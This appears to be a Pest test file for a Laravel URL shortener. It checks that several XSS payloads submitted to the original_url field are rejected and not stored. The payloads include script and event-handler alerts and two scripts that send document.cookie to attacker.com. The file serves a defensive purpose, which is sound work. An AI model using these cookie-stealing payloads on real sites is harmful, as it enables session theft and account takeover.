<?php

use App\Models\ShortUrl; // Import your model if needed
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class); // Reset the database after each test

test('Prevent XSS attacks-1 in original_url field', function () {
    // Define a malicious XSS payload
    $xssPayload = "<script>alert('XSS')</script>";

    // Submit the malicious input
    $response = $this->post(route('shorten'), [
        'original_url' => $xssPayload
    ]);

    // Assert that the request is rejected (validation failure)
    $response->assertSessionHasErrors('original_url');


    // Ensure the XSS payload is not stored in the database
    $this->assertDatabaseMissing('short_urls', [
        'original_url' => $xssPayload
    ]);
});

test('Prevent XSS attacks-2', function () {
    $xssPayload = "<svg/onload=alert('XSS')>";

    $response = $this->post(route('shorten'), [
        'original_url' => $xssPayload
    ]);

    $response->assertSessionHasErrors('original_url');

    $this->assertDatabaseMissing('short_urls', [
        'original_url' => $xssPayload
    ]);
});


test('Prevent XSS attacks-3', function () {
    $xssPayload = "<img src=x onerror=alert('XSS')>";

    $response = $this->post(route('shorten'), [
        'original_url' => $xssPayload
    ]);

    $response->assertSessionHasErrors('original_url');

    $this->assertDatabaseMissing('short_urls', [
        'original_url' => $xssPayload
    ]);
});


test('HTML Attribute-Based:', function () {
    $xssPayload = "><script>alert('XSS')</script>";

    $response = $this->post(route('shorten'), [
        'original_url' => $xssPayload
    ]);

    $response->assertSessionHasErrors('original_url');

    $this->assertDatabaseMissing('short_urls', [
        'original_url' => $xssPayload
    ]);
});



test('URL/Parameter-Based', function () {
    $xssPayload = "<script>document.location='http://attacker.com?cookie=' + document.cookie;</script>";

    $response = $this->post(route('shorten'), [
        'original_url' => $xssPayload
    ]);

    $response->assertSessionHasErrors('original_url');

    $this->assertDatabaseMissing('short_urls', [
        'original_url' => $xssPayload
    ]);
});


test('Injection in URLs or Parameters:', function () {
    $xssPayload = "https://example.com/page?<script>alert('XSS')</script>";

    $response = $this->post(route('shorten'), [
        'original_url' => $xssPayload
    ]);

    $response->assertSessionHasErrors('original_url');

    $this->assertDatabaseMissing('short_urls', [
        'original_url' => $xssPayload
    ]);
});

test('Blind XSS (Stored XSS):', function () {
    $xssPayload = "<script>new Image().src='http://attacker.com/log?data=' + document.cookie;</script>";

    $response = $this->post(route('shorten'), [
        'original_url' => $xssPayload
    ]);

    $response->assertSessionHasErrors('original_url');

    $this->assertDatabaseMissing('short_urls', [
        'original_url' => $xssPayload
    ]);
});
